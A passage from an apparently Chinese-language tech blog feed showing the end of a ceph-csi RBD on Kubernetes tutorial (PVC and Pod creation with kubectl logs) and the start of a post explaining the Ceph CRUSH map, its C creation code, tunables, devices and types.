42m<br>service/kubernetes                  ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    43m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          42m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           42m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       42m<br><br>NAME                                             PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/csi-rbd-sc           rbd.csi.ceph.com           Delete          Immediate           <span class="hljs-literal">true</span>                   28s<br>storageclass.storage.k8s.io/standard (default)   k8s.io/minikube-hostpath   Delete          Immediate           <span class="hljs-literal">false</span>                  43m<br></code></pre></td></tr></table></figure><h3 id="6-3-2、创建PVC"><a href="#6-3-2、创建PVC" class="headerlink" title="6.3.2、创建PVC"></a>6.3.2、创建PVC</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改 ./examples/rbd/pvc.yaml</span><br>vi ./examples/rbd/pvc.yaml<br><br><span class="hljs-comment"># 应用 ./examples/rbd/pvc.yaml</span><br>kubectl apply -f ./examples/rbd/pvc.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,storageclass,pvc -n default<br><br><span class="hljs-comment"># 查看 rbd 中 image 列表</span><br>rbd <span class="hljs-built_in">ls</span> -p cephrbd<br></code></pre></td></tr></table></figure><p><strong>pvc.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/rbd/pvc.yaml">.&#x2F;examples&#x2F;rbd&#x2F;pvc.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PersistentVolumeClaim</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">rbd-pvc</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">group:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">accessModes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">ReadWriteOnce</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">requests:</span><br>      <span class="hljs-attr">storage:</span> <span class="hljs-string">1Gi</span><br>  <span class="hljs-attr">storageClassName:</span> <span class="hljs-string">csi-rbd-sc</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/rbd/pvc.yaml<br>persistentvolumeclaim/rbd-pvc created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,storageclass,pvc -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbdplugin-provisioner-967b7f495-lrmtv   0/7     Pending   0          44m<br>pod/csi-rbdplugin-provisioner-967b7f495-ltb4z   0/7     Pending   0          44m<br>pod/csi-rbdplugin-provisioner-967b7f495-xx5q7   7/7     Running   0          44m<br>pod/csi-rbdplugin-qhchr                         3/3     Running   0          44m<br><br>NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.114.70   &lt;none&gt;        8080/TCP   44m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.111.61.159   &lt;none&gt;        8080/TCP   44m<br>service/kubernetes                  ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    45m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          44m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           44m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       44m<br><br>NAME                                             PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/csi-rbd-sc           rbd.csi.ceph.com           Delete          Immediate           <span class="hljs-literal">true</span>                   2m31s<br>storageclass.storage.k8s.io/standard (default)   k8s.io/minikube-hostpath   Delete          Immediate           <span class="hljs-literal">false</span>                  45m<br><br>NAME                            STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/rbd-pvc   Bound    pvc-173db48b-41bf-4826-9759-08d27838a882   1Gi        RWO            csi-rbd-sc     &lt;<span class="hljs-built_in">unset</span>&gt;                 9s<br><br><br>[bugwz@node03 ceph-csi]# rbd <span class="hljs-built_in">ls</span> -p cephrbd<br>cephrbdimg01<br>cephrbdimg02<br>cephrbdimg03<br>csi-vol-dbc0b1f7-7d2c-4332-a789-8e2345b91158<br></code></pre></td></tr></table></figure><h3 id="6-3-3、创建Pod"><a href="#6-3-3、创建Pod" class="headerlink" title="6.3.3、创建Pod"></a>6.3.3、创建Pod</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改 ./examples/rbd/pod.yaml</span><br>vi ./examples/rbd/pod.yaml<br><br><span class="hljs-comment"># 应用 ./examples/rbd/pod.yaml</span><br>kubectl apply -f ./examples/rbd/pod.yaml<br><br><span class="hljs-comment"># 查看状态</span><br>kubectl get all,storageclass,pvc,pod -n default<br><br><span class="hljs-comment"># 验证 pvc 是否已经在 pod 中挂载</span><br>kubectl <span class="hljs-built_in">exec</span> csi-rbd-pod -- <span class="hljs-built_in">df</span> -h /var/lib/www/html<br></code></pre></td></tr></table></figure><p><strong>pod.yaml 文件示例:</strong> (参考文件 <a href="https://github.com/ceph/ceph-csi/blob/v3.14.1/examples/rbd/pod.yaml">.&#x2F;examples&#x2F;rbd&#x2F;pod.yaml</a>)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-rbd-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">web-server</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">docker.io/library/nginx:latest</span><br>      <span class="hljs-attr">volumeMounts:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>          <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/var/lib/www/html</span><br>  <span class="hljs-attr">volumes:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">mypvc</span><br>      <span class="hljs-attr">persistentVolumeClaim:</span><br>        <span class="hljs-attr">claimName:</span> <span class="hljs-string">rbd-pvc</span><br>        <span class="hljs-attr">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>相关操作记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[bugwz@node03 ceph-csi]$ kubectl apply -f ./examples/rbd/pod.yaml<br>pod/csi-rbd-pod created<br><br><br>[bugwz@node03 ceph-csi]$ kubectl get all,storageclass,pvc,pod -n default<br>NAME                                            READY   STATUS    RESTARTS   AGE<br>pod/csi-rbd-pod                                 1/1     Running   0          11s<br>pod/csi-rbdplugin-provisioner-967b7f495-lrmtv   0/7     Pending   0          49m<br>pod/csi-rbdplugin-provisioner-967b7f495-ltb4z   0/7     Pending   0          49m<br>pod/csi-rbdplugin-provisioner-967b7f495-xx5q7   7/7     Running   0          49m<br>pod/csi-rbdplugin-qhchr                         3/3     Running   0          49m<br><br>NAME                                TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>service/csi-metrics-rbdplugin       ClusterIP   10.101.114.70   &lt;none&gt;        8080/TCP   49m<br>service/csi-rbdplugin-provisioner   ClusterIP   10.111.61.159   &lt;none&gt;        8080/TCP   49m<br>service/kubernetes                  ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    50m<br><br>NAME                           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE<br>daemonset.apps/csi-rbdplugin   1         1         1       1            1           &lt;none&gt;          49m<br><br>NAME                                        READY   UP-TO-DATE   AVAILABLE   AGE<br>deployment.apps/csi-rbdplugin-provisioner   1/3     3            1           49m<br><br>NAME                                                  DESIRED   CURRENT   READY   AGE<br>replicaset.apps/csi-rbdplugin-provisioner-967b7f495   3         3         1       49m<br><br>NAME                                             PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE<br>storageclass.storage.k8s.io/csi-rbd-sc           rbd.csi.ceph.com           Delete          Immediate           <span class="hljs-literal">true</span>                   7m48s<br>storageclass.storage.k8s.io/standard (default)   k8s.io/minikube-hostpath   Delete          Immediate           <span class="hljs-literal">false</span>                  50m<br><br>NAME                            STATUS   VOLUME                                     CAPACITY   ACCESS MODES   STORAGECLASS   VOLUMEATTRIBUTESCLASS   AGE<br>persistentvolumeclaim/rbd-pvc   Bound    pvc-173db48b-41bf-4826-9759-08d27838a882   1Gi        RWO            csi-rbd-sc     &lt;<span class="hljs-built_in">unset</span>&gt;                 5m26s<br><br><br>[bugwz@node03 ceph-csi]$ kubectl <span class="hljs-built_in">exec</span> csi-rbd-pod -- <span class="hljs-built_in">df</span> -h /var/lib/www/html<br>Filesystem      Size  Used Avail Use% Mounted on<br>/dev/rbd1       974M   24K  958M   1% /var/lib/www/html<br></code></pre></td></tr></table></figure><h1 id="七、参考资料"><a href="#七、参考资料" class="headerlink" title="七、参考资料"></a>七、参考资料</h1><ul><li><a href="https://github.com/ceph/ceph-csi">https://github.com/ceph/ceph-csi</a></li><li><a href="https://docs.ceph.com/en/latest/rbd/rbd-kubernetes/">https://docs.ceph.com/en/latest/rbd/rbd-kubernetes/</a></li><li><a href="https://www.cnblogs.com/lianngkyle/p/14772121.html">https://www.cnblogs.com/lianngkyle/p/14772121.html</a></li><li><a href="https://dylanyang.top/post/2021/05/15/k8s%E4%BD%BF%E7%94%A8ceph-csi%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8cephfs/">https://dylanyang.top/post/2021/05/15/k8s%E4%BD%BF%E7%94%A8ceph-csi%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8cephfs/</a></li><li><a href="https://www.cnblogs.com/jiaxzeng/p/14880660.html">https://www.cnblogs.com/jiaxzeng/p/14880660.html</a></li><li><a href="https://www.modb.pro/db/137721">https://www.modb.pro/db/137721</a></li><li><a href="https://kubernetes.io/zh-cn/docs/tutorials/hello-minikube/">https://kubernetes.io/zh-cn/docs/tutorials/hello-minikube/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph CRUSH 设计实现剖析</title>
      <link href="/2023/06/30/ceph-crush/"/>
      <url>/2023/06/30/ceph-crush/</url>
      
        <content type="html"><![CDATA[<p>CRUSH（Controlled Replication Under Scalable Hashing）是 Ceph 存储系统中用于数据分布和复制的算法。关于 CRUSH 的论文解析参考: <a href="https://bugwz.com/2023/06/20/crush">译 - CRUSH: Controlled, Scalable, Decentralized Placement of Replicated Data</a> 。CRUSH map 是 Ceph 集群中一个关键的配置组件，它定义了数据如何在集群的物理硬件上分布。 CRUSH 算法使得 Ceph 能够在无需中心化或者分布式元数据管理器的情况下，高效、可靠地进行数据复制和恢复。</p><h1 id="一、CRUSH-map-解析"><a href="#一、CRUSH-map-解析" class="headerlink" title="一、CRUSH map 解析"></a>一、CRUSH map 解析</h1><p>CRUSH map 包含了集群的层次结构和各种规则，这些规则定义了数据应该如何在集群中分布。 CRUSH map 主要包含以下几个部分：</p><ul><li><code>Tunables</code> : 一组可用于调整 CRUSH 算法行为的参数。</li><li><code>Devices</code> : 定义集群中所有可用的存储设备的列表。</li><li><code>Types</code> : 定义存储层次结构中的不同层级类型。</li><li><code>Buckets</code> : 组织和管理存储设备（如 OSDs ）的逻辑容器。</li><li><code>Rules</code> : 定义了数据的复制方式。</li></ul><p><strong>新建 crush map 相关代码:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> crush_map* <span class="hljs-title function_">crush_create</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">crush_map</span>* <span class="hljs-title">m</span>;</span><br>    m = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(*m));<br>    <span class="hljs-keyword">if</span> (!m) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">memset</span>(m, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*m));<br><br>    <span class="hljs-comment">// 初始化配置</span><br>    set_optimal_crush_map(m);<br>    <span class="hljs-keyword">return</span> m;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_optimal_crush_map</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>)</span><br>&#123;<br>    <span class="hljs-built_in">map</span>-&gt;choose_local_tries = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">map</span>-&gt;choose_local_fallback_tries = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">map</span>-&gt;choose_total_tries = <span class="hljs-number">50</span>;<br>    <span class="hljs-built_in">map</span>-&gt;chooseleaf_descend_once = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">map</span>-&gt;chooseleaf_vary_r = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">map</span>-&gt;chooseleaf_stable = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">map</span>-&gt;allowed_bucket_algs = ((<span class="hljs-number">1</span> &lt;&lt; CRUSH_BUCKET_UNIFORM) | <br>                                (<span class="hljs-number">1</span> &lt;&lt; CRUSH_BUCKET_LIST) | <br>                                (<span class="hljs-number">1</span> &lt;&lt; CRUSH_BUCKET_STRAW) | <br>                                (<span class="hljs-number">1</span> &lt;&lt; CRUSH_BUCKET_STRAW2));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 crush map</span><br><span class="hljs-built_in">rm</span> -rf crushmap.file crushmap-human.file<br>ceph osd getcrushmap -o crushmap.file<br>crushtool -d crushmap.file -o crushmap-human.file<br><span class="hljs-built_in">cat</span> crushmap-human.file<br></code></pre></td></tr></table></figure><p><strong>CRUSH map 示例:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># begin crush map</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">choose_local_tries</span> <span class="hljs-number">0</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">choose_local_fallback_tries</span> <span class="hljs-number">0</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">choose_total_tries</span> <span class="hljs-number">50</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">chooseleaf_descend_once</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">chooseleaf_vary_r</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">chooseleaf_stable</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">straw_calc_version</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">allowed_bucket_algs</span> <span class="hljs-number">54</span><br><br><span class="hljs-comment"># devices</span><br><span class="hljs-string">device</span> <span class="hljs-number">0</span> <span class="hljs-string">osd.0</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">1</span> <span class="hljs-string">osd.1</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">2</span> <span class="hljs-string">osd.2</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">3</span> <span class="hljs-string">osd.3</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">4</span> <span class="hljs-string">osd.4</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">5</span> <span class="hljs-string">osd.5</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><br><span class="hljs-comment"># types</span><br><span class="hljs-string">type</span> <span class="hljs-number">0</span> <span class="hljs-string">osd</span><br><span class="hljs-string">type</span> <span class="hljs-number">1</span> <span class="hljs-string">host</span><br><span class="hljs-string">type</span> <span class="hljs-number">2</span> <span class="hljs-string">chassis</span><br><span class="hljs-string">type</span> <span class="hljs-number">3</span> <span class="hljs-string">rack</span><br><span class="hljs-string">type</span> <span class="hljs-number">4</span> <span class="hljs-string">row</span><br><span class="hljs-string">type</span> <span class="hljs-number">5</span> <span class="hljs-string">pdu</span><br><span class="hljs-string">type</span> <span class="hljs-number">6</span> <span class="hljs-string">pod</span><br><span class="hljs-string">type</span> <span class="hljs-number">7</span> <span class="hljs-string">room</span><br><span class="hljs-string">type</span> <span class="hljs-number">8</span> <span class="hljs-string">datacenter</span><br><span class="hljs-string">type</span> <span class="hljs-number">9</span> <span class="hljs-string">zone</span><br><span class="hljs-string">type</span> <span class="hljs-number">10</span> <span class="hljs-string">region</span><br><span class="hljs-string">type</span> <span class="hljs-number">11</span> <span class="hljs-string">root</span><br><br><span class="hljs-comment"># buckets</span><br><span class="hljs-string">host</span> <span class="hljs-string">node01</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">-3</span>            <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-string">id</span> <span class="hljs-number">-4</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span>  <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-comment"># weight 0.19537</span><br>        <span class="hljs-string">alg</span> <span class="hljs-string">straw2</span><br>        <span class="hljs-string">hash</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># rjenkins1</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.0</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.1</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>&#125;<br><span class="hljs-string">host</span> <span class="hljs-string">node02</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">-5</span>            <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-string">id</span> <span class="hljs-number">-6</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span>  <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-comment"># weight 0.19537</span><br>        <span class="hljs-string">alg</span> <span class="hljs-string">straw2</span><br>        <span class="hljs-string">hash</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># rjenkins1</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.2</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.3</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>&#125;<br><span class="hljs-string">host</span> <span class="hljs-string">node03</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">-7</span>            <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-string">id</span> <span class="hljs-number">-8</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span>  <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-comment"># weight 0.19537</span><br>        <span class="hljs-string">alg</span> <span class="hljs-string">straw2</span><br>        <span class="hljs-string">hash</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># rjenkins1</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.4</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.5</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>&#125;<br><span class="hljs-string">root</span> <span class="hljs-string">default</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">-1</span>            <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-string">id</span> <span class="hljs-number">-2</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span>  <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-comment"># weight 0.58612</span><br>        <span class="hljs-string">alg</span> <span class="hljs-string">straw2</span><br>        <span class="hljs-string">hash</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># rjenkins1</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">node01</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.19537</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">node02</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.19537</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">node03</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.19537</span><br>&#125;<br><br><span class="hljs-comment"># rules</span><br><span class="hljs-string">rule</span> <span class="hljs-string">replicated_rule</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">0</span><br>        <span class="hljs-string">type</span> <span class="hljs-string">replicated</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">take</span> <span class="hljs-string">default</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">chooseleaf</span> <span class="hljs-string">firstn</span> <span class="hljs-number">0</span> <span class="hljs-string">type</span> <span class="hljs-string">host</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">emit</span><br>&#125;<br><span class="hljs-comment"># end crush map</span><br></code></pre></td></tr></table></figure><p><img src="/assets/images/ceph-crush-topo.png" alt="Ceph CRUSH Topo" loading="lazy"></p><h2 id="1-1、Tunables"><a href="#1-1、Tunables" class="headerlink" title="1.1、Tunables"></a>1.1、Tunables</h2><p>一组可用于调整 CRUSH 算法行为的参数。通过调整这些参数，管理员可以优化数据的分布和复制策略，以适应特定的性能需求或硬件配置。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># begin crush map</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">choose_local_tries</span> <span class="hljs-number">0</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">choose_local_fallback_tries</span> <span class="hljs-number">0</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">choose_total_tries</span> <span class="hljs-number">50</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">chooseleaf_descend_once</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">chooseleaf_vary_r</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">chooseleaf_stable</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">straw_calc_version</span> <span class="hljs-number">1</span><br><span class="hljs-string">tunable</span> <span class="hljs-string">allowed_bucket_algs</span> <span class="hljs-number">54</span><br></code></pre></td></tr></table></figure><p><strong>字段解析:</strong></p><ul><li><code>choose_local_tries</code>: 控制 CRUSH 算法在尝试找到一个本地副本（即在同一物理位置，如同一机架或同一数据中心）时的尝试次数。如果设置为 0 ，表示 CRUSH 算法不会尝试在本地找到副本。增加这个值会使算法更倾向于在本地找到副本，可能提高访问速度但减少数据分散度。</li><li><code>choose_local_fallback_tries</code>: 定义了在 choose_local_tries 未能找到本地副本后， CRUSH 算法尝试找到非本地副本之前的额外本地尝试次数。如果设置为 0 ，表示没有额外的本地回退尝试。增加这个值可以增加在本地找到副本的机会，同样可能影响数据的分散度和容错性。</li><li><code>choose_total_tries</code>: 定义了 CRUSH 算法在放弃之前尝试选择不同项的总次数。较低的值可能导致数据分布不均，而较高的值增加了计算复杂性，但可以改善数据的均匀分布。</li><li><code>chooseleaf_descend_once</code>: 控制 CRUSH 算法在选择叶节点（通常是存储设备）时是否只遍历树结构一次。设置为 1 时，算法只遍历一次，减少了计算量并提高了效率，但可能影响在复杂拓扑中的数据分布精度。</li><li><code>chooseleaf_vary_r</code>: 控制每次选择叶节点时种子是否有所变化，以增加随机性。设置为 1 时，每次选择过程的随机性增加，有助于数据的均匀分布。</li><li><code>chooseleaf_stable</code>: 确保相同的输入在 CRUSH 算法的不同版本中给出相同的输出。设置为 1 时，可以保持数据分布的一致性，特别是在升级或修改集群配置时。</li><li><code>straw_calc_version</code>: 指定使用 Straw 算法的版本， Straw 算法用于决定数据在不同存储桶之间的分配。版本 1 是较旧的版本，可能不如版本 2 在数据分布上有效和均匀。</li><li><code>allowed_bucket_algs</code>: 指定允许使用的 bucket 算法的位掩码。通过限制或启用特定的 bucket 算法，管理员可以根据具体的数据分布需求调整算法的使用，影响数据的分布和性能。</li></ul><h2 id="1-2、Devices"><a href="#1-2、Devices" class="headerlink" title="1.2、Devices"></a>1.2、Devices</h2><p>定义集群中所有可用的存储设备的列表。每个设备通常对应一个 OSD（Object Storage Daemon）。每个条目通常包含: 设备ID，OSD编号，类别。<strong>device 的 id 都是大于等于零的非负数。</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># devices</span><br><span class="hljs-string">device</span> <span class="hljs-number">0</span> <span class="hljs-string">osd.0</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">1</span> <span class="hljs-string">osd.1</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">2</span> <span class="hljs-string">osd.2</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">3</span> <span class="hljs-string">osd.3</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">4</span> <span class="hljs-string">osd.4</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br><span class="hljs-string">device</span> <span class="hljs-number">5</span> <span class="hljs-string">osd.5</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span><br></code></pre></td></tr></table></figure><h2 id="1-3、Types"><a href="#1-3、Types" class="headerlink" title="1.3、Types"></a>1.3、Types</h2><p>定义存储层次结构中的不同层级类型。</p><p><strong>字段解析:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># types</span><br><span class="hljs-string">type</span> <span class="hljs-number">0</span> <span class="hljs-string">osd</span>         <span class="hljs-comment"># 基本存储单元，通常对应一个物理存储设备</span><br><span class="hljs-string">type</span> <span class="hljs-number">1</span> <span class="hljs-string">host</span>        <span class="hljs-comment"># 一台物理服务器或虚拟机，它可以包含一个或多个 osd</span><br><span class="hljs-string">type</span> <span class="hljs-number">2</span> <span class="hljs-string">chassis</span>     <span class="hljs-comment"># 机箱或机柜，可以包含一组服务器或多个设备</span><br><span class="hljs-string">type</span> <span class="hljs-number">3</span> <span class="hljs-string">rack</span>        <span class="hljs-comment"># 数据中心中的一个机架，通常包含多个服务器或机柜</span><br><span class="hljs-string">type</span> <span class="hljs-number">4</span> <span class="hljs-string">row</span>         <span class="hljs-comment"># 数据中心中的一行机架</span><br><span class="hljs-string">type</span> <span class="hljs-number">5</span> <span class="hljs-string">pdu</span>         <span class="hljs-comment"># 电源分配单元。不常见，可以用来表示依赖于同一电源单元的设备组</span><br><span class="hljs-string">type</span> <span class="hljs-number">6</span> <span class="hljs-string">pod</span>         <span class="hljs-comment"># 表示包含多个机架或行的更大物理单元</span><br><span class="hljs-string">type</span> <span class="hljs-number">7</span> <span class="hljs-string">room</span>        <span class="hljs-comment"># 数据中心中的一个房间，可能包含多个 pod 或行</span><br><span class="hljs-string">type</span> <span class="hljs-number">8</span> <span class="hljs-string">datacenter</span>  <span class="hljs-comment"># 整个数据中心，是物理存储资源的大集合</span><br><span class="hljs-string">type</span> <span class="hljs-number">9</span> <span class="hljs-string">zone</span>        <span class="hljs-comment"># 一个区域或集群的一部分</span><br><span class="hljs-string">type</span> <span class="hljs-number">10</span> <span class="hljs-string">region</span>     <span class="hljs-comment"># 一个更大的地理区域，可能包含多个数据中心或区域</span><br><span class="hljs-string">type</span> <span class="hljs-number">11</span> <span class="hljs-string">root</span>       <span class="hljs-comment"># CRUSH 层次结构中的最顶层，代表整个存储集群</span><br></code></pre></td></tr></table></figure><h2 id="1-4、Buckets"><a href="#1-4、Buckets" class="headerlink" title="1.4、Buckets"></a>1.4、Buckets</h2><p>用来组织和管理存储设备（如 OSDs ）的逻辑容器。每个 bucket 可以包含 OSDs 或其他 buckets 